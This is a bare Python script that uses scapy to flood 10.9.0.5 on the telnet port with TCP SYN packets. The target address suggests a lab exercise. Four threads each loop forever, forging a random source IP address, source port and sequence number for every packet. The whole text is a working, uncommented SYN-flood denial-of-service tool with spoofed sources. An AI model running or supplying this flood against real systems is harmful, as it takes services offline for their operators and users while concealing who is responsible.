#!/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits
import threading

def spam(pkt):
    while True:
        pkt[IP].src = str(IPv4Address(getrandbits(32)))  # source iP
        pkt[TCP].sport = getrandbits(16)                 # source port
        pkt[TCP].seq = getrandbits(32)                   # sequence number
        send(pkt, verbose = 0)

ip = IP(dst="10.9.0.5")
tcp = TCP(dport=23, flags='S')   
pkt = ip/tcp
t1 = threading.Thread(target=spam, args=(pkt, ))
t2 = threading.Thread(target=spam, args=(pkt, ))
t3 = threading.Thread(target=spam, args=(pkt, ))
t4 = threading.Thread(target=spam, args=(pkt, ))
t1.start()
t2.start()
t3.start()
t4.start()
